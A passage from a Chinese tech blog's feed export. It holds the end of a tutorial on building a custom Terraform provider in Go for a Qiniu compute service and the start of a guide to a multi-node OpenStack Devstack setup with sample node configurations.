class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Provider</span><span class="hljs-params">()</span> <span class="hljs-title">terraform</span>.<span class="hljs-title">ResourceProvider</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> &amp;schema.Provider&#123;</span><br><span class="line">        Schema: <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]*schema.Schema&#123;</span><br><span class="line">            <span class="hljs-string">"url"</span>: &#123;</span><br><span class="line">                Type:        schema.TypeString,</span><br><span class="line">                Optional:    <span class="hljs-literal">true</span>,</span><br><span class="line">                DefaultFunc: schema.EnvDefaultFunc(<span class="hljs-string">"QVM_URL"</span>, <span class="hljs-string">""</span>),</span><br><span class="line">                Description: descriptions[<span class="hljs-string">"url"</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="hljs-string">"ak"</span>: &#123;</span><br><span class="line">                Type:        schema.TypeString,</span><br><span class="line">                Optional:    <span class="hljs-literal">true</span>,</span><br><span class="line">                DefaultFunc: schema.EnvDefaultFunc(<span class="hljs-string">"QVM_AK"</span>, <span class="hljs-string">""</span>),</span><br><span class="line">                Description: descriptions[<span class="hljs-string">"ak"</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="hljs-string">"sk"</span>: &#123;</span><br><span class="line">                Type:        schema.TypeString,</span><br><span class="line">                Optional:    <span class="hljs-literal">true</span>,</span><br><span class="line">                DefaultFunc: schema.EnvDefaultFunc(<span class="hljs-string">"QVM_SK"</span>, <span class="hljs-string">""</span>),</span><br><span class="line">                Description: descriptions[<span class="hljs-string">"sk"</span>],</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">        ResourcesMap: <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]*schema.Resource&#123;</span><br><span class="line">            <span class="hljs-string">"compute_instance"</span>: resourceComputeInstance(),</span><br><span class="line">        &#125;,</span><br><span class="line">        ConfigureFunc: configureProvider,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Schema</code> 声明了 provider 配置文件的定义，对应的 <code>tf</code> 文件这样写：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">provider qvm &#123;</span><br><span class="line">    url = &quot;https://qvm.qiniuapi.com&quot;</span><br><span class="line">    ak = &quot;your app key&quot;</span><br><span class="line">    sk = &quot;your app secret&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果不在 <code>tf</code> 文件里指定 <code>ak</code> 和 <code>sk</code>，则 terraform 会根据 <code>DefaultFunc</code>，从环境变量 <code>QVM_AK</code> 和 <code>QVM_SK</code> 中获取。<code>Optional</code> 代表字段是可选的，即使用户没有填也不会报错。</p><p><code>ResourcesMap</code> 声明了 provider 支持的资源和对应资源的工厂函数，例如这里我们只实现了计算资源，工厂函数的定义我们稍后再解释。</p><h2 id="定义-Resource-Schema"><a href="#定义-Resource-Schema" class="headerlink" title="定义 Resource Schema"></a>定义 Resource Schema</h2><p>上面提到的 <code>resourceComputeInstance</code> 负责创建一个 compute instance resource，对于计算资源我们可以这样定义：</p><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resourceComputeInstance</span><span class="hljs-params">()</span> *<span class="hljs-title">schema</span>.<span class="hljs-title">Resource</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> &amp;schema.Resource&#123;</span><br><span class="line">        Create: resourceComputeInstanceCreate,</span><br><span class="line">        Read:   resourceComputeInstanceRead,</span><br><span class="line">        Update: resourceComputeInstanceUpdate,</span><br><span class="line">        Delete: resourceComputeInstanceDelete,</span><br><span class="line">        Timeouts: &amp;schema.ResourceTimeout&#123;</span><br><span class="line">            Create: schema.DefaultTimeout(<span class="hljs-number">30</span> * time.Minute),</span><br><span class="line">            Update: schema.DefaultTimeout(<span class="hljs-number">30</span> * time.Minute),</span><br><span class="line">            Delete: schema.DefaultTimeout(<span class="hljs-number">30</span> * time.Minute),</span><br><span class="line">        &#125;,</span><br><span class="line">        Schema: <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]*schema.Schema&#123;</span><br><span class="line">            <span class="hljs-string">"image_id"</span>: &#123;</span><br><span class="line">                Type:     schema.TypeString,</span><br><span class="line">                Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                ForceNew: <span class="hljs-literal">true</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="hljs-string">"instance_name"</span>: &#123;</span><br><span class="line">                Type:     schema.TypeString,</span><br><span class="line">                Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="hljs-string">"system_disk"</span>: &#123;</span><br><span class="line">                Type:     schema.TypeList,</span><br><span class="line">                Required: <span class="hljs-literal">true</span>,</span><br><span class="line">                MaxItems: <span class="hljs-number">1</span>,</span><br><span class="line">                Elem: &amp;schema.Resource&#123;</span><br><span class="line">                    Schema: <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]*schema.Schema&#123;</span><br><span class="line">                        <span class="hljs-string">"category"</span>: &#123;</span><br><span class="line">                            Type:     schema.TypeString,</span><br><span class="line">                            Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                            Default:  enums.DiskCategoryCloudEfficiency,</span><br><span class="line">                            ForceNew: <span class="hljs-literal">true</span>,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="hljs-string">"size"</span>: &#123;</span><br><span class="line">                            Type:     schema.TypeInt,</span><br><span class="line">                            Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                            Default:  <span class="hljs-number">40</span>,</span><br><span class="line">                        &#125;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="hljs-string">"data_disk"</span>: &#123;</span><br><span class="line">                Type:     schema.TypeList,</span><br><span class="line">                Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                MinItems: <span class="hljs-number">1</span>,</span><br><span class="line">                MaxItems: <span class="hljs-number">15</span>,</span><br><span class="line">                Elem: &amp;schema.Resource&#123;</span><br><span class="line">                    Schema: <span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]*schema.Schema&#123;</span><br><span class="line">                        <span class="hljs-string">"category"</span>: &#123;</span><br><span class="line">                            Type:     schema.TypeString,</span><br><span class="line">                            Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                            Default:  enums.DiskCategoryCloudEfficiency,</span><br><span class="line">                            ForceNew: <span class="hljs-literal">true</span>,</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="hljs-string">"size"</span>: &#123;</span><br><span class="line">                            Type:     schema.TypeInt,</span><br><span class="line">                            Optional: <span class="hljs-literal">true</span>,</span><br><span class="line">                            Default:  <span class="hljs-number">40</span>,</span><br><span class="line">                        &#125;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Create</code> <code>Read</code> <code>Update</code> <code>Delete</code> 分别是管理资源的回调函数，terraform 框架会在合适的时间调用这几个函数，<code>Timeouts</code> 定义了每个操作的超时时间，<code>Schema</code> 与上面一样，是定义 <code>tf</code> 文件的具体结构。</p><p><code>ForceNew</code> 代表一旦这个字段改变，则 terraform 会删除并重新创建该资源。<code>TypeList</code> 定义了一个列表，如果 <code>MaxItems: 1</code> 时，列表退化为单个资源。</p><p>为了简化起见，<code>Schema</code> 我们省略了很多字段，对应的 <code>tf</code> 文件可以这样写：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">resource &quot;compute_instance&quot; &quot;test&quot; &#123;</span><br><span class="line">    count = &quot;$&#123;var.count&#125;&quot;</span><br><span class="line">    provider = &quot;qvm&quot;</span><br><span class="line">    image_id = &quot;$&#123;var.image&#125;&quot;</span><br><span class="line">    instance_name = &quot;$&#123;var.instance_name&#125;-$&#123;count.index&#125;&quot;</span><br><span class="line">    system_disk &#123;</span><br><span class="line">        category = &quot;efficiency&quot;</span><br><span class="line">        size = 40</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>${var.}</code> 代表在 varaibles.tf 文件里定义的变量，具体可以用法可以参考 terraform 官方文档，这里不过多地介绍。</p><h2 id="定义-Resource-Operation-Function"><a href="#定义-Resource-Operation-Function" class="headerlink" title="定义 Resource Operation Function"></a>定义 Resource Operation Function</h2><h3 id="Create"><a href="#Create" class="headerlink" title="Create"></a>Create</h3><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resourceComputeInstanceCreate</span><span class="hljs-params">(d *schema.ResourceData, meta <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">error</span></span> &#123;</span><br><span class="line">    config := meta.(*Config)</span><br><span class="line">    client, err := config.computeClient()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    systemDisk := d.Get(<span class="hljs-string">"system_disk"</span>).([]<span class="hljs-keyword">interface</span>&#123;&#125;)[<span class="hljs-number">0</span>].(<span class="hljs-keyword">map</span>[<span class="hljs-keyword">string</span>]<span class="hljs-keyword">interface</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    systemDiskParameters := params.CreateInstanceSystemDiskParameters&#123;</span><br><span class="line">        Category: enums.DiskCategory(systemDisk[<span class="hljs-string">"category"</span>].(<span class="hljs-keyword">string</span>)),</span><br><span class="line">        Size:     systemDisk[<span class="hljs-string">"size"</span>].(<span class="hljs-keyword">int</span>),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parameters := &amp;params.CreateInstanceParameters&#123;</span><br><span class="line">        ImageId:            d.Get(<span class="hljs-string">"image_id"</span>).(<span class="hljs-keyword">string</span>),</span><br><span class="line">        SystemDisk:         systemDiskParameters,</span><br><span class="line">        InstanceName:       enums.InstanceName(d.Get(<span class="hljs-string">"instance_name"</span>).(<span class="hljs-keyword">string</span>)),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    log.Printf(<span class="hljs-string">"[DEBUG] CreateInstanceParameters: %#v"</span>, parameters)</span><br><span class="line">    rsp, err := client.CreateInstance(parameters)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        log.Printf(<span class="hljs-string">"[ERROR] create instance error, %v"</span>, err)</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line">    log.Printf(<span class="hljs-string">"[INFO] Instance ID: %s"</span>, rsp.Data.InstanceId)</span><br><span class="line">    d.SetId(rsp.Data.InstanceId)</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> resourceComputeInstanceRead(d, meta)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Create</code> 的实现最重要的一个操作是 <code>SetId</code>，如果服务端资源创建成功，会返回一个 InstanceId，<code>SetId</code> 会将这个 InstanceId 保存，作为以后判断资源是否更新的 key。</p><p>return 前又进行了一次 <code>Read</code> 操作，是为了防止有些状态字段没有通过 CreateResponse 返回，再尝试通过一次 Read 来获取这些状态信息。</p><h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resourceComputeInstanceDelete</span><span class="hljs-params">(d *schema.ResourceData, meta <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">error</span></span> &#123;</span><br><span class="line">    config := meta.(*Config)</span><br><span class="line">    client, err := config.computeClient()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p := &amp;params.DeleteInstanceParameters&#123;</span><br><span class="line">        InstanceId: d.Id(),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _, err = client.DeleteInstance(p)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Update"><a href="#Update" class="headerlink" title="Update"></a>Update</h3><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resourceComputeInstanceUpdate</span><span class="hljs-params">(d *schema.ResourceData, meta <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">error</span></span> &#123;</span><br><span class="line">    <span class="hljs-keyword">return</span> resourceComputeInstanceRead(d, meta)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们暂时不实现 <code>Update</code> 操作，因此这里只是简单地返回 Read。</p><h3 id="Read"><a href="#Read" class="headerlink" title="Read"></a>Read</h3><figure class="highlight golang hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">resourceComputeInstanceRead</span><span class="hljs-params">(d *schema.ResourceData, meta <span class="hljs-keyword">interface</span>&#123;&#125;)</span> <span class="hljs-title">error</span></span> &#123;</span><br><span class="line">    config := meta.(*Config)</span><br><span class="line">    client, err := config.computeClient()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p := &amp;params.DescribeInstanceParameters&#123;</span><br><span class="line">        InstanceId: d.Id(),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rsp, err := client.GetInstance(p)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    instance := &amp;rsp.Data</span><br><span class="line">    d.Set(<span class="hljs-string">"image_id"</span>, instance.ImageId)</span><br><span class="line">    d.Set(<span class="hljs-string">"instance_name"</span>, instance.InstanceName)</span><br><span class="line">    <span class="hljs-comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Read</code> 通过 InstanceId 对资源状态进行查询，保存至 resource data。</p><h2 id="编译和构建"><a href="#编译和构建" class="headerlink" title="编译和构建"></a>编译和构建</h2><p>上面基本代码框架实现后，我们就可以对 plugin 进行编译和构建了：</p><figure class="highlight sh hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go build -o terraform-provider-qvm</span><br></pre></td></tr></table></figure><p>二进制文件的命名必须遵守以下命名规则：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform-provider-&lt;NAME&gt;</span><br></pre></td></tr></table></figure><p>构建后，我们手动将二进制拷贝至 terraform 默认的插件目录：<code>${HOME}/.terraform/plguins</code>。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>进入工作目录，即 <code>tf</code> 文件保存的目录，假设这个目录的结构为：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">terraform/qvm</span><br><span class="line">├── provider.tf</span><br><span class="line">├── resources.tf</span><br><span class="line">├── variables.tf</span><br><span class="line">└── terraform.tfvars</span><br></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform init</span><br></pre></td></tr></table></figure><h3 id="修改配置"><a href="#修改配置" class="headerlink" title="修改配置"></a>修改配置</h3><p>可以通过 <code>export</code> 或创建 <code>.tfvars</code> 文件，对配置进行修改：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export QVM_AK=</span><br><span class="line">export QVM_SK=</span><br></pre></td></tr></table></figure><p>创建 <code>terraform.tfvars</code> 文件：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">instance_name = &quot;&quot;</span><br><span class="line">count = 1</span><br><span class="line">image = &quot;&quot;</span><br></pre></td></tr></table></figure><h3 id="查看更改"><a href="#查看更改" class="headerlink" title="查看更改"></a>查看更改</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform plan</span><br></pre></td></tr></table></figure><p>执行后 terraform 会对配置进行合法性校验。</p><h3 id="应用更改"><a href="#应用更改" class="headerlink" title="应用更改"></a>应用更改</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform apply</span><br></pre></td></tr></table></figure><p>或者指定 <code>.tfvars</code> 文件：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform apply -var-file=&quot;terraform.tfvars&quot;</span><br></pre></td></tr></table></figure><h3 id="销毁"><a href="#销毁" class="headerlink" title="销毁"></a>销毁</h3><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform destroy</span><br></pre></td></tr></table></figure><p>或者指定 <code>.tfvars</code> 文件：</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">terraform destroy -var-file=&quot;terraform.tfvars&quot;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.terraform.io/docs/extend/writing-custom-providers.html" target="_blank" rel="noopener">https://www.terraform.io/docs/extend/writing-custom-providers.html</a></p><p><a href="https://www.terraform.io/docs/extend/how-terraform-works.html" target="_blank" rel="noopener">https://www.terraform.io/docs/extend/how-terraform-works.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 原创 </tag>
            
            <tag> Golang </tag>
            
            <tag> terraform </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 Devstack 搭建 Openstack 集群</title>
      <link href="/hexo-blog/20190107/%E4%BD%BF%E7%94%A8-Devstack-%E6%90%AD%E5%BB%BA-Openstack-%E9%9B%86%E7%BE%A4/"/>
      <url>/hexo-blog/20190107/%E4%BD%BF%E7%94%A8-Devstack-%E6%90%AD%E5%BB%BA-Openstack-%E9%9B%86%E7%BE%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>多节点搭建步骤：</p><p><a href="https://docs.openstack.org/devstack/rocky/guides/multinode-lab.html" target="_blank" rel="noopener">https://docs.openstack.org/devstack/rocky/guides/multinode-lab.html</a></p><p>要配置 kvm，否则使用默认的 qemu 跑 vm 性能会很差：</p><p><a href="https://docs.openstack.org/devstack/rocky/guides/devstack-with-nested-kvm.html" target="_blank" rel="noopener">https://docs.openstack.org/devstack/rocky/guides/devstack-with-nested-kvm.html</a></p><a id="more"></a><p>control 节点配置:</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[[local|localrc]]</span></span><br><span class="line"><span class="hljs-attr">HOST_IP</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.37</span></span><br><span class="line"><span class="hljs-attr">FLAT_INTERFACE</span>=bond0</span><br><span class="line"><span class="hljs-attr">FIXED_RANGE</span>=<span class="hljs-number">10.4</span>.<span class="hljs-number">128.0</span>/<span class="hljs-number">20</span></span><br><span class="line"><span class="hljs-attr">FIXED_NETWORK_SIZE</span>=<span class="hljs-number">4096</span></span><br><span class="line"><span class="hljs-attr">FLOATING_RANGE</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.223</span>/<span class="hljs-number">27</span></span><br><span class="line"><span class="hljs-attr">MULTI_HOST</span>=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attr">LOGFILE</span>=/opt/stack/logs/stack.sh.log</span><br><span class="line"><span class="hljs-attr">ADMIN_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">RABBIT_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">SERVICE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">LIBVIRT_TYPE</span>=kvm</span><br><span class="line"><span class="hljs-attr">IP_VERSION</span>=<span class="hljs-number">4</span></span><br></pre></td></tr></table></figure><p>compute 节点配置:</p><figure class="highlight ini hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-section">[[local|localrc]]</span></span><br><span class="line"><span class="hljs-attr">HOST_IP</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.38</span> # change this per compute node</span><br><span class="line"><span class="hljs-attr">FLAT_INTERFACE</span>=bond0</span><br><span class="line"><span class="hljs-attr">FIXED_RANGE</span>=<span class="hljs-number">10.4</span>.<span class="hljs-number">128.0</span>/<span class="hljs-number">20</span></span><br><span class="line"><span class="hljs-attr">FIXED_NETWORK_SIZE</span>=<span class="hljs-number">4096</span></span><br><span class="line"><span class="hljs-attr">FLOATING_RANGE</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.223</span>/<span class="hljs-number">27</span></span><br><span class="line"><span class="hljs-attr">MULTI_HOST</span>=<span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-attr">LOGFILE</span>=/opt/stack/logs/stack.sh.log</span><br><span class="line"><span class="hljs-attr">ADMIN_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">RABBIT_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">SERVICE_PASSWORD</span>=</span><br><span class="line"><span class="hljs-attr">DATABASE_TYPE</span>=mysql</span><br><span class="line"><span class="hljs-attr">SERVICE_HOST</span>=<span class="hljs-number">10.20</span>.<span class="hljs-number">102.37</span></span><br><span class="line"><span class="hljs-attr">MYSQL_HOST</span>=<span class="hljs-variable">$SERVICE_HOST</span></span><br><span class="line"><span class="hljs-attr">RABBIT_HOST</span>=<span class="hljs-variable">$SERVICE_HOST</span></span><br><span class="line"><span class="hljs-attr">GLANCE_HOSTPORT</span>=<span class="hljs-variable">$SERVICE_HOST</span>:<span class="hljs-number">9292</span></span><br><span class="line"><span class="hljs-attr">ENABLED_SERVICES</span>=n-cpu,q-agt,n-api-meta,c-vol,placement-client</span><br><span class="line"><span class="hljs-attr">NOVA_VNC_ENABLED</span>=<span class="hljs-literal">True</span></span><br><span class="line"><span class="hljs-attr">NOVNCPROXY_URL</span>=<span class="hljs-string">"http://$SERVICE_HOST:6080/vnc_auto.html"</span></span><br><span class="line"><span class="hljs-attr">VNCSERVER_LISTEN</span>=<span class="hljs-variable">$HOST_IP</span></span><br><span class="line"><span class="hljs-attr">VNCSERVER_PROXYCLIENT_ADDRESS</span>=<span class="hljs-variable">$VNCSERVER_LISTEN</span></span><br><span class="line"><span class="hljs-attr">LIBVIRT_TYPE</span>=kvm</span><br><span class="line"><span class="hljs-attr">IP_VERSION</span>=<span class="hljs-number">4</span></span><br></pre></td></tr></table></figure><ul><li><code>FIXED_RANGE</code> 是 vm 实例的内网地址，供 vm 之间访问，vm 创建时便会分配一个，创建后一般不能更改。</li><li><code>FLOATING_RANGE</code> 是 vm 实例的外网地址，供物理机访问 vm，以及 vm 访问物理机，可以在实例创建后进行绑定和解绑。这个网段一般设置为物理机 IP 的子网段。</li></ul><p>如果需要 